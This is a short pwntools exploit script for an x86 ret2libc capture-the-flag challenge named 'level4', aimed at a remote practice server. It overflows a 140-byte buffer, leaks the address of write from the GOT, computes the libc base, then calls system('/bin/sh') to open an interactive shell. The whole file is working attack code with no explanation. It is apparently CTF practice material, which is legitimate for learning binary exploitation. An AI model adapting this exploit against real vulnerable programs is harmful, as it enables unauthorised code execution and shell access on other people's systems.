#Made by fly_autumn
#x86 ret2libc
from pwn import *
#p = process("./level4")
p = remote("node5.buuoj.cn",27205)
elf = ELF("./level4")
libc = ELF("./libc.so.6")
context(os="linux",arch="i386")

offset = 140
write_plt = elf.plt["write"]
write_got = elf.got["write"]
main_addr = elf.sym["main"]

payload = b"\x00" * offset + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
p.sendline(payload)
write_addr = u32(p.recv(4))
log.success("write addr: "+hex(write_addr))
libc_addr = write_addr - libc.sym["write"]
log.success("libc addr: "+hex(libc_addr))
sys_addr = libc_addr + libc.sym["system"]
log.success("sys addr: "+hex(sys_addr))
sh_addr = libc_addr + next(libc.search("/bin/sh"))
log.success("sh addr: "+hex(sh_addr))
payload2 = b"\x00" * offset + p32(sys_addr) + p32(main_addr) + p32(sh_addr)
p.sendline(payload2)

p.interactive()
